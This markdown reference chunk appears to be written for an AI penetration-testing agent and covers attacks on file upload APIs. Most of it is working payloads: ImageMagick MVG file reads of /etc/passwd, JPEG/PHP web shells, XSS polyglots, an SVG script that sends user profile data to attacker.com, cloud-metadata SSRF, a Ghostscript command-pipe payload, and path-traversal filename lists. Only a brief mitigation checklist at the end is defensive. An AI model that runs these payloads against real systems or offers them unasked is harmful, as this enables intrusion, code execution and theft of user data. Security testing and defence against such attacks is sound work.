# File Upload, Polyglot & ImageMagick Attacks — Agent Chunk 89a
> Source: CVE-2025-55298 ImageMagick advisory, polyglot file research, image processing library CVEs, OWASP file upload guidance
> Purpose: Teaches the agent to exploit file upload API endpoints using polyglot files, path traversal, ImageMagick vulnerabilities, and magic-byte validation bypass
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing file upload API endpoints. File uploads are high-risk because they can lead to RCE (via processing library exploits), stored XSS (via SVG/HTML uploads), path traversal (via filename manipulation), and server resource exhaustion. Test in order: content-type validation bypass, magic-byte bypass, filename path traversal, then processing library exploits.

---

## 1. CVE-2025-55298: ImageMagick Format String Vulnerability

### Vulnerability Details
```
Product: ImageMagick (used by millions of web applications for image processing)
Type: Format string vulnerability in filename handling
Impact: Information disclosure, potential RCE
Trigger: Specially crafted filename processed by ImageMagick

When an API endpoint uses ImageMagick to resize/convert uploaded images,
the filename is passed to internal functions that interpret format strings.
```

### Exploitation
```bash
# Craft filename with format string specifiers
# ImageMagick processes format strings in filenames like %d, %n, %s

# Information disclosure via filename
curl -X POST https://api.target.com/api/upload \
  -F "file=@innocent.png;filename=%n%n%n%n.png"
# %n writes the number of bytes written so far - can crash or leak info

# Path-based exploitation
curl -X POST https://api.target.com/api/upload \
  -F "file=@innocent.png;filename=%[filename:flag].png"
# ImageMagick property access via % syntax

# Read local files via MVG (Magick Vector Graphics)
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
EOF

curl -X POST https://api.target.com/api/upload \
  -F "file=@exploit.mvg;type=image/x-mvg"
# ImageMagick renders file contents as image text
```

---

## 2. Polyglot File Attacks

### Principle
A polyglot file is valid as multiple file types simultaneously. This bypasses validation that checks file headers (magic bytes) or MIME types because the file genuinely IS a valid image.

### JPEG/PHP Polyglot
```bash
# Create a file that is both a valid JPEG and valid PHP
# JPEG magic bytes: FF D8 FF E0
# PHP code injected in EXIF comment

exiftool -Comment='<?php system($_GET["cmd"]); ?>' innocent.jpg
mv innocent.jpg shell.php.jpg

# Upload via API
curl -X POST https://api.target.com/api/avatar/upload \
  -F "file=@shell.php.jpg"

# If server stores with .php extension or processes PHP:
curl "https://api.target.com/uploads/shell.php.jpg?cmd=id"
```

### PNG/HTML Polyglot
```python
# Create PNG with HTML payload in tEXt chunk
import struct, zlib

def create_png_html_polyglot():
    # Minimal valid PNG
    signature = b'\x89PNG\r\n\x1a\n'
    
    # IHDR chunk (1x1 pixel, 8-bit RGB)
    ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
    ihdr = create_chunk(b'IHDR', ihdr_data)
    
    # tEXt chunk with HTML payload
    text_data = b'Comment\x00<script>alert(document.cookie)</script>'
    text = create_chunk(b'tEXt', text_data)
    
    # IDAT chunk (actual pixel data)
    raw_data = b'\x00\xff\x00\x00'  # filter byte + 1 green pixel
    idat_data = zlib.compress(raw_data)
    idat = create_chunk(b'IDAT', idat_data)
    
    # IEND chunk
    iend = create_chunk(b'IEND', b'')
    
    return signature + ihdr + text + idat + iend

def create_chunk(chunk_type, data):
    chunk = chunk_type + data
    return struct.pack('>I', len(data)) + chunk + struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)

with open('polyglot.png', 'wb') as f:
    f.write(create_png_html_polyglot())
```

### GIF/JavaScript Polyglot
```bash
# GIF89a header interpreted as valid JavaScript variable assignment
# GIF89a = valid GIF header and GIF89a = JavaScript identifier

printf 'GIF89a/*<script>alert(1)</script>*/=1;' > polyglot.gif
# Valid GIF header + JavaScript payload in comment
```

### SVG with Embedded Script
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="data:image/png;base64,iVBORw0KGgo..." />
  <script type="text/javascript">
    fetch('/api/user/profile', {credentials: 'include'})
      .then(r => r.json())
      .then(d => fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(d))));
  </script>
</svg>
```

```bash
curl -X POST https://api.target.com/api/upload \
  -F "file=@malicious.svg;type=image/svg+xml"
# If served with Content-Type: image/svg+xml, browser executes the script
```

---

## 3. Path Traversal via Multipart Filename

### Filename Manipulation
```bash
# Basic path traversal
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php;filename=../../../var/www/html/shell.php"

# URL-encoded traversal
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php;filename=..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"

# Double-encoded traversal
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php;filename=..%252f..%252f..%252fshell.php"

# Null byte injection (older systems)
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php;filename=shell.php%00.jpg"

# Backslash traversal (Windows)
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php;filename=..\\..\\..\\inetpub\\wwwroot\\shell.php"

# Mixed slash traversal
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php;filename=../..\\../shell.php"

# Overlong UTF-8 encoding
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php;filename=..%c0%af..%c0%afshell.php"
```

### Multipart Header Injection
```bash
# Inject additional Content-Disposition parameters
curl -X POST https://api.target.com/api/upload \
  -H "Content-Type: multipart/form-data; boundary=----BOUNDARY" \
  -d '------BOUNDARY
Content-Disposition: form-data; name="file"; filename="innocent.jpg"; filename*=UTF-8'\'''\''../../../shell.php
Content-Type: image/jpeg

<file contents>
------BOUNDARY--'
# Some parsers use the last filename, others the first
```

---

## 4. Image Processing Library Exploitation

### ImageMagick — Beyond CVE-2025-55298
```bash
# ImageTragick (CVE-2016-3714) - still found in legacy systems
# SVG with external entity processing
cat > exploit.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640" height="480" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://attacker.com/ssrf-callback" />
</svg>
EOF

# Ghostscript delegate exploitation
cat > exploit.eps << 'EOF'
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
EOF
```

### libvips Exploitation
```bash
# libvips is used by Sharp (Node.js), ruby-vips, etc.
# SSRF via SVG external references
cat > ssrf.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
  <image xlink:href="http://169.254.169.254/latest/meta-data/"
         width="100" height="100"/>
</svg>
EOF

curl -X POST https://api.target.com/api/images/resize \
  -F "file=@ssrf.svg" -F "width=200" -F "height=200"
# libvips fetches the external URL during processing
```

---

## 5. Magic-Byte Validation Bypass

### Magic Bytes Reference
```
JPEG:  FF D8 FF E0  (or FF D8 FF E1 for EXIF)
PNG:   89 50 4E 47 0D 0A 1A 0A
GIF:   47 49 46 38 39 61 (GIF89a) or 47 49 46 38 37 61 (GIF87a)
PDF:   25 50 44 46 (%PDF)
ZIP:   50 4B 03 04
GZIP:  1F 8B
BMP:   42 4D
TIFF:  49 49 2A 00 (little-endian) or 4D 4D 00 2A (big-endian)
WebP:  52 49 46 46 ... 57 45 42 50 (RIFF...WEBP)
```

### Bypass Techniques
```bash
# Prepend magic bytes to malicious file
# Server checks first 4 bytes = JPEG, but file is actually PHP
printf '\xFF\xD8\xFF\xE0' > bypass.php.jpg
cat shell.php >> bypass.php.jpg

# Minimal valid JPEG with PHP payload
python3 -c "
import struct
# JPEG SOI + APP0 marker
data = b'\xff\xd8\xff\xe0'
# APP0 length and identifier
data += struct.pack('>H', 16) + b'JFIF\x00'
# Version, units, density
data += b'\x01\x01\x00\x00\x01\x00\x01\x00\x00'
# PHP payload in COM marker
data += b'\xff\xfe'  # COM marker
php = b'<?php system(\$_GET[\"cmd\"]); ?>'
data += struct.pack('>H', len(php) + 2) + php
# End of image
data += b'\xff\xd9'
open('polyglot.php.jpg', 'wb').write(data)
"
```

### Content-Type Confusion
```bash
# Test which Content-Type the server trusts

# Client says JPEG, actually PHP
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php;type=image/jpeg"

# Double extension
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.php.jpg"

# Case variation
curl -X POST https://api.target.com/api/upload \
  -F "file=@shell.pHp"

# Alternative PHP extensions
for ext in php php3 php4 php5 php7 pht phtml phps; do
  curl -s -o /dev/null -w "%{http_code} $ext" \
    -X POST https://api.target.com/api/upload \
    -F "file=@shell.$ext;type=image/jpeg"
  echo
done
```

---

## 6. Mitigation Checklist
- Validate file type by magic bytes AND extension AND Content-Type (all three must agree)
- Re-encode uploaded images using a safe library; strip all metadata
- Store uploads outside the web root with randomized filenames
- Serve uploads from a separate domain (no cookie scope overlap)
- Set Content-Disposition: attachment for all downloaded files
- Disable ImageMagick delegates (Ghostscript, SVG external entities)
- Use a Content Security Policy that blocks inline scripts on upload domains
- Limit file size, image dimensions, and processing time
- Sanitize filenames: strip path separators, null bytes, and special characters
- Use libvips with `--vips-block-untrusted` flag to block external references
